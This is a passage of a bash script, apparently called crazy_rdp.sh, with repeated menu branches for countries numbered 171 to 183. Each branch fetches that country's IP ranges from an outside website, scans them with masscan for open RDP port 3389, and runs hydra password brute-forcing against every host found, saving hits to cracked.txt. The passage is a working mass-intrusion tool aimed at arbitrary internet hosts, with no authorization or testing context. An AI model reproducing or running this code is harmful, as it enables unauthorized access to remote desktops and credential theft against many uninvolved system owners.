read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "171" ]; then
curl http://ipdiapazon.16mb.com/Spain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "172" ]; then
curl http://ipdiapazon.16mb.com/Sri_lanka.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "173" ]; then
curl http://ipdiapazon.16mb.com/Sudan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "174" ]; then
curl http://ipdiapazon.16mb.com/Suriname.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "175" ]; then
curl http://ipdiapazon.16mb.com/Swaziland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "176" ]; then
curl http://ipdiapazon.16mb.com/Sweden.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "177" ]; then
curl http://ipdiapazon.16mb.com/Switzerland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "178" ]; then
curl http://ipdiapazon.16mb.com/Syrian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "179" ]; then
curl http://ipdiapazon.16mb.com/Taiwan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "180" ]; then
curl http://ipdiapazon.16mb.com/Tajikistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "181" ]; then
curl http://ipdiapazon.16mb.com/Tanzania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "182" ]; then
curl http://ipdiapazon.16mb.com/Thailand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "183" ]; then
curl http://ipdiapazon.16mb.com/Togo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

